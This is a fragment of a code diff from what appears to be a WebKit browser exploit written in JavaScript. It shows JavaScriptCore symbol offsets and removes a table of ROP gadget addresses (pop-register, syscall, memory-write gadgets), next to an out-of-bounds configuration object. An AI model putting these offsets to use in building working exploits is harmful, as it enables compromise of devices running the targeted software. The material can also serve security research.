@@ -125,18 +125,6 @@ export const WEBKIT_LIBRARY_INFO = {
         "JSC::Symbols::Float64ArrayPrivateName": "0x3CC79B8",
         "JSC::Symbols::execPrivateName": "0x3CC7A30",
     }
-    ROP_GADGETS: {
-        "pop_rax": new AdvancedInt64("0x43970"),  // Ex: pop rax; ret;
-        "pop_rdi": new AdvancedInt64("0x441a3"),  // Ex: pop rdi; ret;
-        "pop_rsi": new AdvancedInt64("0x673a8"),  // Ex: pop rsi; ret;
-        "pop_rdx": new AdvancedInt64("0x673a1"),  // Ex: pop rdx; ret;
-        "pop_rcx": new AdvancedInt64("0x4a8f6"),  // Ex: pop rcx; ret;
-        "pop_r8": new AdvancedInt64("0x11ab42"),  // Ex: pop r8; ret;
-        "pop_r9": new AdvancedInt64("0x11ab40"),  // Ex: pop r9; ret;
-        "pop_rsp": new AdvancedInt64("0x446b3"),  // Ex: pop rsp; ret;
-        "syscall": new AdvancedInt64("0x1bca2d"), // Ex: syscall; ret;
-        "mov_qword_ptr_rdi_rax": new AdvancedInt64("0x1c8e1a") // Ex: mov qword ptr [rdi], rax; ret;
-    }
 };
 
 export let OOB_CONFIG = {
